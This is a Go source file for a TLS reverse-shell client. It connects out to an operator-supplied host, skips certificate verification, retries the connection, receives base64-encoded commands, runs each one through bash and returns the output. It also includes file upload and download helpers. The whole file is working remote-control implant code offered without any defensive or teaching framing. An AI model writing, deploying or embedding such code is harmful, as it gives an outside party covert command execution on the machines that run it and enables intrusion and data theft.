package main

import (
	// "bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}


func execInput(input string) (string, error) {
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")

	cmd, err := exec.Command("bash", "-c", input).Output()
	if err != nil {
		log.Fatal(err)
	}
	return string(cmd[:]), err
}

func genCert(email string) string {
	cmd, err := exec.Command("bash", "./certGen.sh", email).Output()

	if err != nil {
		fmt.Printf("Error generating SSL Certificate: %s", err)
		os.Exit(1)
	}
	outstr := string(cmd)
	return outstr
}


func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port")
		return
	}
	genCert(os.Getenv("SSLCERTGENEMAIL")) 
	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if(err != nil){
		fmt.Println("Could not generate SSL Certificate. Exiting...")
	}
	reDial := 0
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	var conn *tls.Conn
	for ok := true; ok; ok = reDial < 5 {
		conn, err = tls.Dial("tcp", arguments[1], &config)
		reDial++
		if err == nil {
			break
		}

	}
	

	defer conn.Close()
	log.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])

	state := conn.ConnectionState()
	for _, v := range state.PeerCertificates {
		fmt.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
		fmt.Println(v.Subject)
	}

	log.Println("client: handshake: ", state.HandshakeComplete)
	log.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)

	for {
		buffer := make([]byte, 1024)
		_, err := conn.Read(buffer)
		handleError(err)
		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		fmt.Println("$ " + string(sDec))
		resp, err := execInput(string(sDec))
		fmt.Println(resp)
		time.Sleep(time.Second)
		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
		_, err = conn.Write([]byte(encodedResp))
		handleError(err)
		time.Sleep(time.Second)
	}
}
